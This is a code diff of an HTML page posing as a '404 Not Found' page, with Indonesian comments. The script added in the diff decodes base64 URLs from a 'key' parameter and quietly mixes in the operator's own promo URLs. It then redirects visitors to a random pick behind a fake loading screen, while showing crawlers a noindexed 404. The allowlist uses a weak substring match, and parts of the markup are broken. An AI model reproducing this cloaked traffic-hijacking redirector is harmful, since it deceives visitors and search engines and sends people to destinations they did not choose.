@@ -2,13 +2,12 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
+<base href="https://livesekhd.eu.org">
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<!-- HEAD -->
 <title id="meta-title">404 Not Found</title>
-<meta id="meta-desc" name="description" content="Halaman tidak ditemukan">
-<meta id="og-title" property="og:title" content="404 Not Found">
-<meta id="og-desc" property="og:description" content="Halaman tidak ditemukan">
-
+<meta name="description" content="Page not found." id="meta-desc">
+<meta property="og:title" content="404 Not Found" id="og-title">
+<meta property="og:description" content="Page is unavailable or invalid." id="og-desc">	
 <meta name="robots" content="noindex, nofollow">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -67,48 +66,53 @@
   }
   </style>
 </head>
-<body>
+<body
 
+<!-- Loader -->>
 <div id="loader" class="loader-screen">
   <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
     <span class="visually-hidden">Loading...</span>
   </div>
   <p>Redirecting to destination page...</p>
 <div class="lol">
-<img data-src="https://i0.wp.com/i.gifer.com/7V2P.gif?resize=720,512" alt="Gambar" width="300" height="200">
 <img src="https://i0wp.com/iili.io/FFCw6LG.md.jpg?resize=720,512" alt="FFCw6LG.md.jpg" loading="lazy" />
 </div>
 </div>
-
-
-
-
+<!-- 404 Page -->
 
 <div class="container error-container" id="errorPage">
   <div class="error-code">404</div>
   <h2 class="mb-3">Oops! Page not found</h2>
   <p class="text-muted">The link is invalid or not part of this website.</p>
 </div>
-
 <script>
 (function () {
   const params = new URLSearchParams(window.location.search);
   const encoded = params.get('key');
+
+  // Kalau tidak ada key, tidak melakukan apa-apa
   if (!encoded) return;
 
   try {
     const decoded = atob(encoded.trim());
-    const userUrls = decoded.split('|');
+    const userUrls = decoded.split('|'); // URL dari orang (di-encode ke base64)
 
-    // ✅ URL default langsung ditulis (tidak encoded)
-    const myDefaultUrl = "https://abnormalitylovingmammal.com/myvideo";
+    // ✅ URL default milik lo yang wajib ikut di-random-kan
+    const myDefaultUrls = [
+      "https://abnormalitylovingmammal.com/myvideo",
+      "https://pwcenter.eu.org/promo"
+    ];
 
-    const allUrls = [...userUrls, myDefaultUrl];
+    // Gabung semua jadi satu
+    const allUrls = [...userUrls, ...myDefaultUrls];
+
+    // Pilih acak salah satu dari semua URL itu
     const finalUrl = allUrls[Math.floor(Math.random() * allUrls.length)];
 
     const urlObj = new URL(finalUrl);
     const host = urlObj.hostname;
 
+    // Whitelist domain (biar makin aman)
     const allowedDomains = [
       "abnormalitylovingmammal.com",
       "pwcenter.eu.org",
@@ -120,47 +124,64 @@
     const isAllowed = allowedDomains.some(domain => host.includes(domain));
 
     if (isAllowed) {
+      // Ganti meta tag kalau perlu
       const title = "Sedang mengalihkan ke halaman tujuan...";
-      document.getElementById('meta-title')?.innerText = title;
-      document.getElementById('meta-desc')?.setAttribute('content', title);
-      document.getElementById('og-title')?.setAttribute('content', title);
-      document.getElementById('og-desc')?.setAttribute('content', title);
+      document.getElementById('meta-title').innerText = title;
+      document.getElementById('meta-desc').setAttribute('content', title);
+      document.getElementById('og-title').setAttribute('content', title);
+      document.getElementById('og-desc').setAttribute('content', title);
 
-      document.getElementById("errorPage")?.style?.display = "none";
-      document.getElementById("loader")?.style?.display = "flex";
+      // Tampilkan loading
+      document.getElementById("errorPage").style.display = "none";
+      document.getElementById("loader").style.display = "flex";
 
+      // Redirect setelah 1.2 detik
       setTimeout(() => {
         window.location.href = finalUrl;
       }, 1200);
     } else {
-      console.warn("Domains not allowed:", host);
+      console.warn("Domain tidak diizinkan:", host);
     }
+
   } catch (err) {
-    console.error("Broken Site:", err);
+    console.error("Gagal decode base64:", err);
   }
 })();
+</script>
 
-// ✅ Lazy load image
-document.addEventListener("DOMContentLoaded", function () {
-  const images = document.querySelectorAll('img[data-src]');
-  const observer = new IntersectionObserver((entries, obs) => {
+
+<script>
+	document.addEventListener("DOMContentLoaded", function () {
+  const images = document.querySelectorAll('img:not([loading])');
+
+  const imageMap = new Map();
+
+  images.forEach(img => {
+    imageMap.set(img, img.src);
+    img.src = "https://i0.wp.com/i.gifer.com/7V2P.gif?resize=720,512"; 
+  });
+
+  const onIntersection = (entries, observer) => {
     entries.forEach(entry => {
       if (entry.isIntersecting) {
         const img = entry.target;
-        img.src = img.getAttribute('data-src');
-        img.removeAttribute('data-src');
-        obs.unobserve(img);
+        const realSrc = imageMap.get(img);
+        if (realSrc) {
+          img.src = realSrc;
+          imageMap.delete(img);
+        }
+        observer.unobserve(img);
       }
     });
-  }, {
+  };
+
+  const observer = new IntersectionObserver(onIntersection, {
     rootMargin: "0px 0px 100px 0px",
     threshold: 0.01
   });
 
-  images.forEach(img => observer.observe(img));
+  imageMap.forEach((_, img) => observer.observe(img));
 });
-</script>
-
 
 
 </script>
